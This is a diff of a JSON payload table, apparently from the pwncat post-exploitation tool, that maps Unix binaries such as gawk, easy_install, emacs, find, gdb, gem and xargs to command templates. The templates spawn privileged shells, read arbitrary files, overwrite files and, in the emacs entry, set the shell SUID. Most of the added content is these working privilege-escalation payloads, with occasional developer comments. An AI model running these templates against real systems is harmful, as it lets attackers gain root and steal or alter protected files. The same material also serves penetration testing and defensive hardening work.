@@ -210,33 +210,6 @@
 		}
 	],
 //-------------------------------------------------------------------
-	"gawk": [
-		{
-			"type": "shell",
-			"payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'",
-			"exit": "exit"
-		},
-		{
-			"type": "read",
-			"stream": "print",
-			"payload": "{command} // {lfile}"
-		},
-		{
-			"type": "read",
-			"stream": "raw",
-			"payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
-		},
-		{
-			"type": "write",
-			"stream": "print",
-			"args": [
-				"-v", "LFILE={lfile}",
-				"'BEGIN {{ printf \"\" > LFILE; while (getline > 0){{ print >> LFILE; }} }}'"
-			],
-			"exit": "{ctrl_d}"
-		}
-	],
-//-------------------------------------------------------------------
 	"base32": [
 		{
 			"type": "read",
@@ -543,6 +516,321 @@
 			"input": "!{shell} -p\n",
 			"exit": "exit\nq\n"
 		}
-	]
+	],
+//-------------------------------------------------------------------
+	"easy_install": [
+		{
+			"type": "shell",
+			"payload": "TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('/bin/sh', 'sh', '-c', '{shell} <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; {command} $TF",
+			"args": [],
+			"exit": "exit\n"
+		},
+		{	
+			"type": "read",
+			"stream": "raw",
+			"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d);echo \"import sys; sys.stdout.buffer.write(open('{lfile}', 'rb').read())\" > $TF/setup.py; {command} $TF 2>/dev/null | {tail} -n +4",
+			"args": []
+		}
+		// This seems to write small files... but not large (over ~4 KB). So we won't use it... ???
+		// ,{
+		// 	"type": "write",
+		// 	"stream": "base64",
+		// 	"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/b64; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import base64; open('{lfile}','wb').write(base64.b64decode(open('$TF/b64', 'rb').read()))''')\" > $TF/setup.py; {command} $TF 2>/dev/null",
+		// 	"args": [],
+		// 	"exit": "{ctrl_d}{ctrl_d}"
+		// }
+	],
+//-------------------------------------------------------------------
+	"eb": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["logs"],
+			"input": "!{shell} -p\n",
+			"exit": "exit\nq\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"ed": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input": "!{shell} -p\n",
+			"exit": "exit\nq\n"
+		},
+		{	
+			"type": "read",
+			"stream": "raw",
+			"payload": "echo ',p' | {command}",
+			"args": ["-s", "{lfile}"],
+			"input" : ",p\n",
+			"exit" : "q\n"
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "echo -e \"1,\\$d\\na\\n$({cat})\\n.\\nw\\nq\\n\" | {command}",
+			"args": ["-s", "{lfile}"],
+			"exit": "{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"emacs": [
+		{
+			"type": "shell",
+			"payload": "{command}; {shell} -p",
+			"args": ["-Q", "-nw", "--eval '(chmod \"{shell}\" #o4755)'" , "--eval \"(kill-emacs)\""],
+			"exit": "exit\n"
+		},
+		{	
+			"type": "read",
+			"stream": "raw",
+			"payload": "TF=$({mktemp}); {command}; {cat} $TF ",
+			"args": ["-Q", "-nw", "{lfile}", "--eval \"(write-file \\\"$TF\\\")\"", "--eval '(kill-emacs)'"]
+		},
+		{	
+			"type": "write",
+			"stream": "print",
+			"payload": "{cat} > /tmp/.em; {command}",
+			"args": ["-Q", "-nw", "/tmp/.em", "--eval \"(write-file \\\"{lfile}\\\")\"", "--eval '(kill-emacs)'"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"env": [
+		{
+			"type": "shell",
+			"payload": "{command} {shell} -p",
+			"args": [],
+			"exit": "exit\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"eqn": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "TF={lfile}; {command} | {grep} -Pzo \"(?s)\\.lf 1 $TF.*\" | {tail} -n +2",
+			"args": ["$TF"]
+		}
+	],
+//-------------------------------------------------------------------
+	"expand": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"expect": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-c", "\"spawn {shell} -p; interact\""],
+			"exit": "exit\n"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command}",
+			"args": ["-c", "\"spawn {cat} {lfile}; interact\""]
+		}
+		// Theoretically we should be able to get File Write for this.
+		// Sine it has it own little subprocess, I can't seem to get stdin to funnel in. 
+	],
+//-------------------------------------------------------------------
+	"facter": [
+		{
+			"type": "shell",
+			"payload": "TF=$({mktemp} -d); echo 'exec(\"{shell} -p\")' > $TF/x.rb; FACTERLIB=$TF {command}",
+			"args": [""]
+		}
+		// This does not behave with sudo very often.
+		// Because it sets an environment variable, -E must be used
+		// when calling sudo (which pwncat currently does not have support for)
+		// and the user needs to be able to preserve the environment...
+	],
+//-------------------------------------------------------------------
+	"find": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": [".", "-exec", "{shell} -p", "\\;", "-quit"]
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command}",
+			"args": [".", "-exec", "{cat} {lfile}", "\\;", "-quit"]
+		}
+	],
+//-------------------------------------------------------------------
+	"flock": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-u", "/", "{shell} -p"]
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command}",
+			"args": ["-u", "/", "{cat} {lfile}"]
+		},
+		{
+			"type": "write",
+			"stream": "base64",
+			"payload": "{command}",
+			"args": ["-u", "/", "{sh} -c \"{base64} -d > {lfile}\""],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"fmt": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command}",
+			"args": ["-pNON_EXISTING_PREFIX", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"fold": [
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command}",
+			"args": ["-w99999999", "{lfile}"]
+		}
+	],
+//-------------------------------------------------------------------
+	"ftp": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input": "!{shell} -p\n",
+			// Exit the shell, then exit the FTP client
+			"exit": "exit\nexit\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"gawk": [
+		{
+			"type": "shell",
+			"payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'",
+			"exit": "exit"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command} // {lfile}"
+		},
+		{
+			"type": "read",
+			"stream": "raw",
+			"payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"args": [
+				"-v", "LFILE={lfile}",
+				"'BEGIN {{ printf \"\" > LFILE; while (getline > 0){{ print >> LFILE; }} }}'"
+			],
+			"exit": "{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"gcc": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-wrapper", "{shell},-p,-s", "."]
+		}
+	],
+//-------------------------------------------------------------------
+	"gdb": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-q", "-nx", "-ex", "'!{shell} -p'", "-ex", "quit"]
+		},
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-q", "-nx", "-ex", "'python import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'", "-ex", "quit"]
+		},
+		{
+			"type": "read",
+			"stream":"print",
+			"payload": "{command}",
+			"args": ["-q", "-nx", "-ex", "'set height 0'", "-ex", "'python print(open(\"{lfile}\").read())'", "-ex", "quit"]
+		},
+		{
+			"type": "write",
+			"stream":"print",
+			"payload": "{command}",
+			"args": ["-q", "-nx", "-ex", "'python import sys; open(\"{lfile}\",\"w\").write(sys.stdin.read())'", "-ex", "quit"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+		// We SHOULD be able to read base64 data... but for the life of me, I cannot get the whole file to come through. Leaving this alone.
+		// {
+		// 	"type": "write",
+		// 	"stream":"base64",
+		// 	"payload": "{command}",
+		// 	"args": ["-q", "-nx", "-ex", "'python import sys,base64; exec(\"\"\"with open(\"{lfile}\",\"wb\") as f:\\n\\tfor chunk in iter(lambda: sys.stdin.read(4), b\"\"):\\n\\t\\tf.write(base64.b64decode(chunk))\"\"\")'", "-ex", "quit"],
+		// 	"exit" : "{ctrl_d}"
 
+		// }
+		// ,
+	],
+//-------------------------------------------------------------------
+	"gem": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["open", "-e", "'{shell} -c {shell} -p'", "rdoc"]
+		},
+		{
+			"type": "read",
+			"stream" : "raw",
+			"payload": "{command}",
+			"args": ["open", "-e", "'{cat} {lfile}'", "rdoc"]
+		}
+	],
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//-------------------------------------------------------------------
+	"xargs": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-a", "/dev/null", "{shell}", "-p"],
+			"exit": "exit\n"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-a", "{lfile}", "-0"]
+		}
+	]
 }
